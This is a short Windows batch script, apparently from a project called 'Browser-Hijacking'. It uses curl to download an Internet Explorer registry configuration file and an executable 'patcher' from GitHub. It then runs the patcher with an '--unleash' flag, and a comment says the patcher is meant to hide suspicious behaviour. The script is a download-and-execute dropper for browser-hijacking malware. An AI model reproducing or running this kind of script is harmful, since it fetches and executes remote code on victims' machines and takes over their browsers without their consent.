@REM Download IE configuration registry file
curl -o %tmp%\ieconf.reg --url https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
@REM Import configuration file into registry
@REM reg import %tmp%\ieconf.reg
@REM Download patcher to make the program run normally without suspicious behavior
curl -o %tmp%\patcher.exe --url https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
@REM Execute patcher
%tmp%\patcher.exe --unleash "%cd%"